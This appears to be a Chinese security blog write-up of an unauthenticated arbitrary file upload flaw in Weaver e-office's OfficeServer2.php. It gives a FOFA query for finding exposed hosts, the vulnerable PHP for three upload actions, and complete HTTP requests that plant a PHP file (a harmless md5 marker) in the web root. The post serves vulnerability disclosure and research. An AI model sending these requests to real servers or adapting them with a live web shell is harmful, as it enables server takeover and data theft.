---
title: "泛微e-office OfficeServer2.php 文件上传漏洞"
source: https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer2-rce.html
asset_dir: assets/泛微e-office-officeserver2.php-文件上传漏洞
---

# 泛微e-office OfficeServer2.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/9 08:26
- 1100浏览
- [0评论](#comment)
- 51分钟阅读

深入探索

Office

软件

服务器

---

# 漏洞简介

[泛微](https://mrxn.net/tag/泛微)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office `iWebOffice/OfficeServer2.php` 接口 `SAVEFILE` 、`SAVEVERSION` 和 `SAVETEMPLATE` 存在任意[文件上传](https://mrxn.net/tag/文件上传)漏洞，允许未经身份验证的攻击者上传恶意代码，植入后门，获取服务器权限，并控制整个 Web 服务器。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

深入探索

安全工具开发

在线安全工具

云安全解决方案

## SAVEFILE

```
$mFilePath = $_SERVER['DOCUMENT_ROOT']."attachment";
......
case "SAVEFILE" :
    $mFileName = $_REQUEST['FILENAME'];
    $mRecordID = $_REQUEST['RECORDID'];
    $mFullPath = $mFilePath."/".$mRecordID."/".$mFileName;
    if ( ( $_FILES['MsgFileBody']['tmp_name'] ) )
    {
        if ( ( $_FILES['MsgFileBody']['tmp_name'], ( "utf-8", "gbk", $mFullPath ) ) )
        {
            $mFileSize = $_FILES['MsgFileBody']['size'];
            $result = true;
        }
        else
        {
            $MsgError = $_lang['file_save_fail'];
            $result = false;
        }
    }
    else
    {
        $MsgError = $_lang['file_upload_fail'];
        $result = false;
    }
    if ( !$result )
    {
        break;
    }
    $MsgObj = $MsgObj."STATUS=".( $_lang['file_save_success']."!" )."\r\n";
    break;
```

因 `FILENAME` 和 `RECORDID` 参数用户可控，导致可以上传任意文件并执行远程代码。

漏洞预警服务

## SAVETEMPLATE

```
case "SAVETEMPLATE" :
    $mRecordID = $TEMPLATE;
    $mFileName = $FILENAME;
    $mFileType = $FILETYPE;
    $mFullPath = $mFilePath."/".$mRecordID.$mFileType;
    $mFullPath = ( "utf-8", "gbk", $mFullPath );
    $MsgObj = $MsgObj."mFullPath=".( "mFullPath" )."\r\n";
    $mDescript = $DESCRIPT;
    $mFileDate = $FileDate;
    $mUserName = $UserName;
    if ( ( $_FILES['MsgFileBody']['tmp_name'] ) )
    {
        if ( ( $_FILES['MsgFileBody']['tmp_name'], $mFullPath ) )
        {
            $mFileSize = $_FILES['MsgFileBody']['size'];
            $result = true;
        }
        else
        {
            $MsgError = "Save File Error";
            $result = false;
        }
    }
```

## SAVEVERSION

```
case "SAVEVERSION" :
    $mRecordID = $RECORDID;
    $mUserName = $USERNAME;
    $mFileName = $FILENAME;
    $mFileType = $FILETYPE;
    $mDescript = $DESCRIPT;
    $mFileDate = ( "Y-m-d H:i:s" );
    $mSql = "insert into Version_File (RecordID,FileType,FileDate,FilePath,UserName,Descript) values ('".$mRecordID."','".$mFileType."','".$mFileDate."','".$mFilePath."','".$mUserName."','".$mDescript."')";
    if ( ( $mSql ) )
    {
        $result = true;
    }
    else
    {
        $result = false;
    }
    $mSql = "SELECT Max(FileID) as FileID FROM Version_File WHERE RecordID='".$mRecordID."'";
    $rs = ( $mSql );
    if ( $row = ( $rs ) )
    {
        $mFileID = $row['FileID'];
        $MsgObj = $MsgObj."FILID=".( $mFileID )."\r\n";
    }
    $mFullPath = $mFilePath."/".$mRecordID.$mFileID.$mFileType;
    $MsgObj = $MsgObj."FULPATH=".( $mFullPath )."\r\n";
    if ( ( $_FILES['MsgFileBody']['tmp_name'], $mFullPath ) )
    {
        $mFileSize = $_FILES['MsgFileBody']['size'];
        $result = true;
        $MsgObj = $MsgObj."STATUS=".( $_lang['file_save_version'].$mFullPath )."\r\n";
    }
    else
    {
        $MsgObj = $MsgObj."STATUS=".( "Save File Error".$mFullPath )."\r\n";
        $result = false;
    }
```

# 漏洞复现

## SAVEFILE

```
POST /iWebOffice/OfficeServer2.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Length: 248

------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="FILENAME"

test.php
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="OPTION"

SAVEFILE
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundarySIELKZKzD7vQmdsO--
```

访问上传文件 `attachment/test.php`

[![泛微e-office OfficeServer2.php 文件上传漏洞](images/img-001-f8b55194cabe.webp)](https://image.mrxn.net/0ecabf3710534f64a3f49fdda8785d07.webp)

## SAVETEMPLATE

```
POST /iWebOffice/OfficeServer2.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Length: 248

------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="TEMPLATE"

test.php
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="OPTION"

SAVETEMPLATE
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundarySIELKZKzD7vQmdsO--
```

访问上传文件 `attachment/test.php`

[![泛微e-office OfficeServer2.php 文件上传漏洞](images/img-002-f8b55194cabe.webp)](https://image.mrxn.net/0ecabf3710534f64a3f49fdda8785d07.webp)

## SAVEVERSION

```
POST /iWebOffice/OfficeServer2.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Length: 248

------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="RECORDID"

test
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="OPTION"

SAVEVERSION
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="FILETYPE"

.php
------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundarySIELKZKzD7vQmdsO--
```

响应里包含文件物理路径，base64解码后即可看到文件名，一般为 RECORDID+FileID 组成，如 test1.php

物流软件安全

[![泛微e-office OfficeServer2.php 文件上传漏洞](images/img-003-3584d2da24c1.webp)](https://image.mrxn.net/ba44034947bb45a4b2d3754cd8edf253.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.SAVEFILE](#toc-4-1-)
- [4.2.SAVETEMPLATE](#toc-4-2-)
- [4.3.SAVEVERSION](#toc-4-3-)
- [5.漏洞复现](#toc-5-)
- [5.1.SAVEFILE](#toc-5-1-)
- [5.2.SAVETEMPLATE](#toc-5-2-)
- [5.3.SAVEVERSION](#toc-5-3-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALkUlEQVR4AeybCZLbyA5E9Xz/O/s3lH4UC2Rp6bFbivjVYUwyF4BlgpoeL/Prcrn8/k79/vNl7x+6wUw3MPO7PuNdd27hzFMXK3uveq5ze7su/w7WQr761o9PeQLbQr62fXmmZgcHLnCrnoN4Mx3iewZznauLkD64Ye+BeDN9NktdtB8yD4L6Hc0/wn3ftpC9uK7f9wQOC4FsHUZ89Yi+FZA59sPIzenPENL3bL7mwNgD4eVVvTKr8tarfZD7wojO2+NhIXtzXf/8E/jPC/FtEf0pQN4GeffVIbmZb06E5OV77DM632f315CZ5kUzEB+C6mLPq38H//NCvnPT1TN/Av9sIb41IuTtkouzo0HyEJzl9jokC+fY7wnJdd2Z6h27L/8b+M8W8jcO9/8447CQ/jbIZw8H8pYN/heB6BB8NOer5aUfzjvDlwZ9hSFnhBG/rOsPiH4lX/+AkX9Jd3+cnbG0s6bDQs5CS/u5J7AtBLJ1uI/PHq3egKqeh8zvuhziV2+Vel1XyUVIHlDasPJVm9AuyqtSrusq+bMIXH+XouchOtzHfd+2kL24rt/3BH7VG/Gd6keGvAVd79x7qcsh/fLuyzuaL+zes7x6q8zXdZW8Y3lVcP/MlXm11iekP+0388NCIFuHET0nRJfPEJLzDYHwnofosxzEn/VBfLhhzzq763DrAbp9/b4AbL8LDmwazHUYc30wjD7c+GEhvXnxn30Cv+C2Hbhtvb9VkFzXZ8ftOTlkDgTV+xyI33XzZ2hWD85n9Jy8o3Me6bNc74Ocx/wZrk9If2pv5of/yoJs0XO5RTmMvrrY8+odzcE4T73j5XK5joDk4YjXwO4fzoBkd9b1EqKbu4pf/4DoEPySrj/MwahDuH5HiH8d8vUPCIcjrk/I1wP6pB+H7yH9cJAtqrt9udh1GPvgPncOjDn1GXrfQjPw3IzqqYL7eYgPQe8j1owqGH0IL++sen9l1ifEp/IhOF0InG8Xonv+2moVPKf3vuqtUu8ImQtB/eqpkhcWr6rrKkhPaVUQXt6+yquC0S+tap+t69KqIHkIllZVmbOC5CB4lpku5Cy8tH//BLaF1GbPCsZtmvFoEF8dwvXVZxzGvDnRflFdhPTDDfVEiCefYb8HvNYHyUPw0X36/Sq/LaTIqvc/ge3XIZCtQtCj9S1CfAiamyHczzkfkpM7D6JDsOvywt77iENmwoj2iTW7Sg7Jl1YF4fodYfSrpwqiww3XJ6SezAfVtpDZViHb88w9J4fk5LM8JKc/QxhzzhVnfaU/k9lyv+sv/xebV5/XuZ0wnlldhHPfeYXbQmxa+N4nsC0Esj0IeqzaWhVEh3M0L8JzOfMd65770ofM3XteQzwYsfd2br/YfTifZ84+UR3Spy7qyyE54LIt5LK+PuIJTBfi9jylvGP3IdtWF3sfjDl9GHX7Ibo59T3OPPWO9kJmQ1C95+Xdh/RBUF+E6DCivnMLpwsxvPBnn8C2kNrOvjwGZKudQ3R79OWiughjH4Tr2wfRIagPI1cvhHMPRh3CvVfHmlUFycGI5VVB9Lqucg6Menn76jlIHljfQy4f9nX48xDItvo5Ibrb1YfocI4994hD5nifjvaLkDwc/z6AvT37iENm2i/2vq7rz7Dn5Xvc/pU1G7L0n30CLy8ExrfH47rlGe+6+RlC7mNfRzj6cNT2fd5rr9U1jH3mIDoEK7svONcvl8s+tv29LkVIHwTVC19eSDWt+ndPYFuIb4W3guP2yus5OTyXrxlVcJ6H6LO56mLNsroG46yeM9/x2Vzvg9yv98vF3qdeuC2kyKr3P4HDn4d4JLcoFyFvAYyoL8LoOw+iy3u+c3OQPhjRfCGce3CuV8++YMzByM3CqEO4vgjRIaguQnS44fqE+HQ+BLdfh/gmipCteU71jvpi9+WQeXLzcK7rz9A5Z2hP99Rn2POdz/rUe16uP0NzhesTMntKb9K37yHP3h/yRj/KQ3IQNA/hEOy6/FmEzAEOLcDw/3MYgFGH57j9Yr3RVXIRMk/eEeb++oT0p/Vmvhby5gX022/f1CEfIwjWR7GqN5RW1fVnefXuq/fpqcNz56k+e8TSnqlZXr2jMyFnm/ldl9svQuYA67ffLx/2tX1Td1uz88Fti3C7nuXVnSuqQ2aoi/odIXl1CIcjmhEhGbkIow7hEDTXEeL3M0N0GLH3yyE55xSu7yE+nQ/B7XuI56ktVUG2py6WVyUXS6uC9NV1lX7H8qogeRjRfGX2pS6eeWpmHmHPzzjkjM6Dkas/299z1b8+IfUUPqi27yEwbvtse3VuOM/BqFe2CkYdwiE4u0/13qt7fZDZEDQL4RBU9z5yiK8OI1fvaH/XO4fMg+DeX5+Q/dP4gOuHC+lb79yfw0zXf4TP9t/L3fPq/t2H4xt6littX33O3ttf95xc3Ge9frgQgwt/5gk8XAjkLXKrcM497qPc79+/tz/0r6x9YmlVcsj9YMR7vl7NqYL0dr28KnVIDoLqldkXnPsQHUZ0DjzWHy7EYQt/5glsC/ENgGzR23ddrt8R0j/LQXwYsc95xCH9+5z3FOGYqTxEh2Bp+7JfDZKDoL4I0c2ri490/cJtIUVWvf8JbAuBbLlvFUYdwj16z6t3NCfqdw7j/FlO/QzhfAZE955inwFjrvtySE4uwqhDOIxo3nMUbgvRXPjeJ3D4vSzIFj1Wba2qc0gOgvodIT6MWDOrzEN8eXn7gtE/y3Wtc+epw/2ZcO7bP8N+nxlXh9wHWH8ecvmwr+33styW6Dkh2+v8u7k+B8b5zoVRt0/sOUgebmh2hs7Ql0NmyPVFiC/vCPEhqO88iA5B/cL1PaSewgfV9HsIZHt9qzPuz0lfVBfVO+qL+vKOMJ7P/BlCsjDio5nd79x7qctF9Y73/PUJ6U/rzXz7HgJ5ezzPbIsw5mZ5SA6CfR5En/Wrw/0cxIcbPur1LHDrgdv/Etf7zXeE9JsXIbp5CIcRzZsrXJ8Qn8qH4GEhtaUqGLdZ2r48P4w5CNcXIToE1TvC6HtPc3Dumys0W9f7gvRCUM88RJd3X13UFyH9M67e++WFh4WUuOp9T2C6ELcpQrYPQfWO/lTU5TOEzNPvfXDft68QkoVzdLYIyVVvlXpdV8Hol7YviA9BPQh3HoRDsOcgOrB+pX75sK/DJwRu2wK247ptEbj+Vf8t0C4gvvlmD39qWJnud16ZKvW6roLcB47/lWRWhFsW5nlIzj4RokOw7n+v4DznvDM8LOQstLSfewKHX6l7azcvF2HcOoTr2yfC6JuD6BDsulyE5GBE/UKIV9dVnqGu99V1OYz9l0u6ILq5qJfrvyEgHhzx8ucLRs85Z7g+IX8e2qfA9iv1vq3ZAc11H8a3AMLNP0JI3rkwcvv15WdoBsYZ6h0hOWfpy0VIrvudmxe7Lz/D9Qk5eypv1LbvIZDtw3PomX0LZgivzXOu6Fx5R7jN717v7dy8OmSWXB9GvfvmREheLsKoQzjccH1CfFofgttC3PojnJ0bsuXuO+9Z3Vzvg/vzK29vx/Kqui6HzK5MFYTrl1YF0WFEc2Jlq+RiaVWdl2ZtCzG08L1P4LAQGLcP4bNjwuhDOAR7n2/CIx3G/t4H8eGIzoajB2hv6Gzg+msLDQiHoPoMITkYsedh7h8W0psX/9kn8NcX4tvmTwPyNsx4z3f+bJ+5wtmM8vYF49n07O/4yO95uX3iTC//ry+khq76/hP45wvxbejYjwx5WyHYfblzYJ6DeGZFZ0B8eUeIDyM6B0b9UX/vM991YP15yOXDvg6fELfWcXZuc/qQt2emmxMhebloP8TvvOf0C/U6lndWMN7jLFMaJOfc0qrkMPrqr+BhIa80r+zffwLbQiDbhfv43SPUm1QFme+c0s4KktMzL850/WcQxntAOJxjnwnJdb2fDcYchENw378tZC+u6/c9gbWQ9z370zv/DwAA//8XR+q0AAAABklEQVQDANA2ecWlI79VAAAAAElFTkSuQmCC)

手机扫码阅读
